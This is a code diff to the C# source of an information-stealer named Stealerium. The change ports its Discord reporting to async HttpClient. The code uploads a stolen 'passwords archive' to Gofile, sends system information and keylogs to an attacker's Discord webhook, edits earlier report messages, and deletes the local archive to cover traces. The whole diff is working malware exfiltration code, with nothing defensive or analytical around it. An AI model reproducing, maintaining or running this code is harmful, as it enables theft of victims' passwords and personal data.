@@ -1,9 +1,9 @@
 ﻿using System;
-using System.Collections.Specialized;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Net;
-using System.Text;
+using System.Net.Http;
+using System.Threading.Tasks;
 using Newtonsoft.Json.Linq;
 using Stealerium.Helpers;
 using Stealerium.Modules.Implant;
@@ -49,15 +49,13 @@ namespace Stealerium
             return id;
         }
 
-        public static bool WebhookIsValid()
+        public static async Task<bool> WebhookIsValid()
         {
             try
             {
-                using (var client = new WebClient())
+                using (var client = new HttpClient())
                 {
-                    var response = client.DownloadString(
-                        Config.Webhook
-                    );
+                    var response = await client.GetStringAsync(Config.Webhook);
                     return response.StartsWith("{\"type\": 1");
                 }
             }
@@ -73,19 +71,23 @@ namespace Stealerium
         ///     Send message to discord channel
         /// </summary>
         /// <param name="text">Message text</param>
-        public static string SendMessage(string text)
+        public static async Task<string> SendMessage(string text)
         {
             try
             {
-                var discordValues = new NameValueCollection();
-
-                using (var client = new WebClient())
+                var discordValues = new Dictionary<string, string>
                 {
-                    discordValues.Add("username", Config.Username);
-                    discordValues.Add("avatar_url", Config.Avatar);
-                    discordValues.Add("content", text);
-                    var response = client.UploadValues(Config.Webhook + "?wait=true", discordValues);
-                    return GetMessageId(Encoding.UTF8.GetString(response));
+                    { "username", Config.Username },
+                    { "avatar_url", Config.Avatar },
+                    { "content", text }
+                };
+
+                using (var client = new HttpClient())
+                {
+                    var content = new FormUrlEncodedContent(discordValues);
+                    var response = await client.PostAsync(Config.Webhook + "?wait=true", content);
+                    var responseString = await response.Content.ReadAsStringAsync();
+                    return GetMessageId(responseString);
                 }
             }
             catch (Exception error)
@@ -101,18 +103,25 @@ namespace Stealerium
         /// </summary>
         /// <param name="text">New text</param>
         /// <param name="id">Message ID</param>
-        public static void EditMessage(string text, string id)
+        public static async Task EditMessage(string text, string id)
         {
             try
             {
-                var discordValues = new NameValueCollection();
-
-                using (var client = new WebClient())
+                var discordValues = new Dictionary<string, string>
                 {
-                    discordValues.Add("username", Config.Username);
-                    discordValues.Add("avatar_url", Config.Avatar);
-                    discordValues.Add("content", text);
-                    client.UploadValues(Config.Webhook + "/messages/" + id, "PATCH", discordValues);
+                    { "username", Config.Username },
+                    { "avatar_url", Config.Avatar },
+                    { "content", text }
+                };
+
+                using (var client = new HttpClient())
+                {
+                    var content = new FormUrlEncodedContent(discordValues);
+                    var request = new HttpRequestMessage(new HttpMethod("PATCH"), Config.Webhook + "/messages/" + id)
+                    {
+                        Content = content
+                    };
+                    await client.SendAsync(request);
                 }
             }
             catch
@@ -159,7 +168,7 @@ namespace Stealerium
         ///     Format system information for sending to telegram bot
         /// </summary>
         /// <returns>String with formatted system information</returns>
-        private static void SendSystemInfo(string url)
+        private static async Task SendSystemInfo(string url)
         {
             UploadKeylogs();
 
@@ -249,19 +258,19 @@ namespace Stealerium
 
             var last = GetLatestMessageId();
             if (last != "-1")
-                EditMessage(info, last);
+                await EditMessage(info, last);
             else
-                SetLatestMessageId(SendMessage(info));
+                SetLatestMessageId(await SendMessage(info));
         }
 
-        public static void SendReport(string file)
+        public static async Task SendReport(string file)
         {
             Logging.Log("Sending passwords archive to Gofile");
             var url = GofileFileService.UploadFile(file);
-            File.Delete(file);
             Logging.Log("Sending report to discord");
-            SendSystemInfo(url);
+            await SendSystemInfo(await url);
             Logging.Log("Report sent to discord");
+            File.Delete(file);
         }
     }
 }
